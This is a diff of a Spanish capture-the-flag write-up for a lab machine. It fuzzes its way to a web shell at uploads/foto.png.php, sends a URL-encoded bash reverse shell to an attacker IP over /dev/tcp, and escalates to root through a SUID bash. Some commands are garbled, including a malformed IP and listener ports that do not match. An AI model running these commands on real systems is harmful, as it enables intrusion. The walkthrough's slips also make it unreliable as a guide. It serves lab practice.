@@ -1,112 +1,100 @@
-# 🎣 **Operación Pescador** 🎣
-### *Máquina vulnerable de **The Hackers Labs***
-**Sistema Operativo:** Linux | **Dificultad:** Media
+# **CTF: Reconocimiento, Explotación y Escalada de Privilegios**
 
 ---
 
-## 📌 **🏷️ Tags**
-`Linux` · `Gobuster` · `Wfuzz` · `RCE` · `Web Shell` · `SUID`
+## **🔍 Fase de Reconocimiento (RECON)**
 
----
-
-## 🔧 **📥 Instalación**
-1. **Descarga** el archivo `.zip` que contiene la máquina virtual `.ova` de **Operación Pescador**.
-2. **Extrae** el archivo y **impórtalo** en **VirtualBox**.
-3. **Configura** la interfaz de red para que coincida con tu entorno de ataque (recomendado: **NAT** o **Host-Only**).
-4. **Inicia** la máquina víctima (`10.0.4.39`) y tu máquina atacante.
-
----
-
-## 🔍 **🕵️ Reconocimiento de Hosts**
-Antes de atacar, descubre la IP de la máquina víctima con `netdiscover`:
+### **1. Resolución de DNS**
+Para acceder correctamente al dominio `mail.innovasolutions.thl`, añadimos la entrada al archivo `/etc/hosts`:
 
 ```bash
-netdiscover -i eth1 -r 10.0.0.0/16
+sudo nano /etc/hosts
 ```
-
-**Resultado:**
-```
-IP            MAC Address            Vendor
------------------------------------------------
-10.0.4.39     08:00:27:80:8c:91    PCS Systemtechnik GmbH
-```
-
-✅ **IP identificada:** `10.0.4.39`
-
----
-
-## 🌐 **🚀 Escaneo de Puertos**
-Ejecuta un **Nmap** agresivo para enumerar servicios:
-
-```bash
-nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.39
-nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.39
-```
-
-**Puertos abiertos:**
-| Puerto | Servicio       | Versión               |
-|--------|----------------|-----------------------|
-| 22     | SSH            | OpenSSH 9.2p1 Debian  |
-| 80     | HTTP (Apache)  | Apache 2.4.65         |
-
-🔹 **Dominio asociado:** `mail.innovasolutions.thl`
-🔹 **Añade al `/etc/hosts`:**
+Agregamos la siguiente línea:
 ```plaintext
-10.0.4.39   mail.innovasolutions.thl
+<IP_DEL_SERVIDOR>    mail.innovasolutions.thl
 ```
-
----
-
-## 🔎 **🕵️‍♂️ Gobuster: Fuzzing de Directorios**
-Busca rutas ocultas con **Gobuster**:
-
+Guardamos y verificamos la resolución:
 ```bash
-gobuster dir -u http://mail.innovasolutions.thl \
-  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2.3-medium.txt \
-  -x html,php,txt,bak,sh -b 403,404 -t 60
+ping mail.innovasolutions.thl
 ```
 
-**Hallazgos clave:**
-- `/login.php` → Panel de login.
-- `/uploads/` → Directorio con archivos sospechosos.
-- `/upload.php` → Formulario de subida.
+---
 
-🔹 **Archivo interesante:** `foto.png.php` (¡no es una imagen!).
+### **2. Enumeración de la IP**
+Si no se conoce la IP del servidor, se puede obtener mediante:
+```bash
+enum mail.innovasolutions.thl
+```
+o
+```bash
+dig mail.innovasolutions.thl
+```
 
 ---
 
-## 💻 **🚨 Explotación: RCE (Remote Code Execution)**
-1. **Fuzzea parámetros** con **Wfuzz** para encontrar vulnerabilidades:
-   ```bash
-   wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/... \
-     -u "http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id" \
-     --hc 404 --hl 2
-   ```
-   ✅ **Parámetro vulnerable:** `cmd`
+## **🌐 Fase de Escaneo Web**
 
-2. **Ejecuta comandos remotos**:
-   ```bash
-   http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id
-   ```
+### **1. Fuzzing de Directorios**
+Usamos `wfuzz` para buscar directorios ocultos en la web:
+```bash
+wfuzz -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id" --hc 404 --hl 2
+```
+- **`-w`**: Ruta del diccionario.
+- **`-u`**: URL a fuzzear.
+- **`--hc 404`**: Oculta respuestas con código 404.
 
-3. **Obtén una **Reverse Shell**:
-   - **Escucha en tu máquina:**
-     ```bash
-     sudo nc -nlvp 4444
-     ```
-   - **Ejecuta en el navegador** (con URL encoding):
-     ```plaintext
-     http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%34%2e%31%32%2f%34%34%34%34%20%30%3e%26%31%27
-     ```
-   ✅ **Shell obtenida como `www-data`!**
+**Resultado encontrado**:
+- `/uploads` (Tamaño de respuesta: **338 bytes**).
 
 ---
 
-## 🛠️ **🖥️ Tratamiento de TTY**
-Mejora la interactividad de la shell:
+## **💻 Fase de Explotación (RCE - Remote Code Execution)**
+
+### **1. Identificación del Parámetro Vulnerable**
+Probamos si el archivo `/uploads/foto.png.php` permite ejecución de comandos:
+```bash
+curl "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=id"
+```
+**Respuesta esperada**: Código `200` con salida del comando `id`.
+
+### **2. Fuzzing del Parámetro `cmd`**
+Usamos `wfuzz` para encontrar parámetros ejecutables:
+```bash
+wfuzz -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2.3-medium.txt -u "http://mail.innovasolutions.thl/uploads/foto.png.php?FUZZ=id" --hc 404 --hl 2
+```
+**Resultado**:
+```plaintext
+000005340:   200        3121 L   25664 W    677615 Ch   "cmd"
+```
+✅ **Parámetro vulnerable encontrado**: `cmd`.
+
+---
+
+### **3. Obtención de Reverse Shell**
+#### **🔹 Configuración del Listener**
+En la máquina atacante:
+```bash
+sudo nc -nlvp 443
+```
+#### **🔹 Ejecución del One-Liner**
+Desde el navegador o `curl`:
+```bash
+curl "http://mail.innovasolutions.thl/uploads/foto.png.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.16812%2F4444%200%3E%261%27"
+```
+**Nota**: Se aplica **URL Encoding** para evitar errores.
+
+---
+
+### **4. Tratamiento de la TTY**
+Una vez obtenida la shell, mejoramos la interacción:
 ```bash
 script /dev/null -c bash
-Ctrl+Z
+```
+**Ctrl + Z** para suspender el proceso.
+
+En la terminal local:
+```bash
 stty raw -echo; fg
 reset xterm
 export TERM=xterm
@@ -115,39 +103,58 @@ export SHELL=bash
 
 ---
 
-## 🔐 **🔓 Escalada de Privilegios (SUID)**
-1. **Busca binarios con SUID**:
-   ```bash
-   find / -perm -4000 -type f 2>/dev/null
-   ```
-   ✅ **Hallazgo:** `/bin/bash` tiene permisos SUID.
+## **🚀 Fase de Escalada de Privilegios**
 
-2. **Escalada a `root`**:
-   ```bash
-   /bin/bash -p
-   ```
-   ✅ **¡Acceso total como `root`!**
+### **1. Verificación de Permisos SUID**
+```bash
+find / -perm -4000 -type f 2>/dev/null 
+```
+**Resultado**:
+```plaintext
+
+/usr/local/bin/get-report
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/bash
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign 
+...
+/usr/bin/bash
+```
+✅ **Binario vulnerable**: `/usr/bin/bash`.
+
+### **2. Explotación con Bash SUID**
+```bash
+/bin/bash -p
+```
+**Resultado**:
+```bash
+bash-5.2# whoami
+root
+```
+🎉 **Acceso como root obtenido**.
+
+### **3. Lectura de la Flag**
+```bash
+cd /root
+ls
+cat root.txt
+```
 
 ---
 
-## 🏆 **🎯 Flags Obtenidas**
-| Usuario       | Flag                          |
-|---------------|-------------------------------|
-| `laptop`      | `THL{FGF34DU-----ER!RDDLLK}`  |
-| `root`        | `THL{QOK44------LEDFFGBGH}`   |
+## **📌 Resumen Final**
+| **Fase**               | **Acción**                                                                 |
+|------------------------|---------------------------------------------------------------------------|
+| **Reconocimiento**     | Resolución DNS, escaneo de puertos y directorios.                        |
+| **Explotación**        | RCE mediante parámetro `cmd` en `/uploads/foto.png.php`.               |
+| **Escalada**           | Uso de `/bin/bash -p` para obtener privilegios de root.                 |
 
----
-
-## 📌 **📝 Resumen de Ataques**
-| Fase          | Herramienta       | Resultado                     |
-|---------------|-------------------|-------------------------------|
-| Reconocimiento| `netdiscover`     | IP de víctima: `10.0.4.39`   |
-| Escaneo       | `nmap`            | Puertos 22 (SSH) y 80 (HTTP)  |
-| Fuzzing       | `gobuster`        | `/uploads/foto.png.php`       |
-| Explotación   | `wfuzz` + `nc`    | RCE + Reverse Shell (`www-data`) |
-| Escalada      | `find` + `/bin/bash -p` | Acceso `root` |
-
----
-
-## 📢 **💡 Conseos interactivos.
-- **Revisa permisos SUID**
+✅ **CTF Completado con éxito**. 🚩
